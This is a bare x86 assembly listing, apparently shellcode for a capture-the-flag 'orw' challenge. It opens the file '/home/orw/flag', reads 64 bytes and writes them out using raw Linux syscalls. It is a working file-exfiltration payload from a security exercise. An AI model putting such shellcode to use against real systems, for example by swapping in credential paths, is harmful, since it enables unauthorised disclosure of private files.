global _start
section .text

_start:
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    mov eax, 0x05
    xor ecx, ecx
    xor edx, edx
    int 0x80

    sub esp, 0x40
    mov ebx, eax
    mov eax, 0x03
    mov ecx, esp
    mov edx, 0x40
    int 0x80

    mov eax, 0x04
    xor ebx, ebx
    mov ecx, esp
    mov edx, 0x40
    int 0x80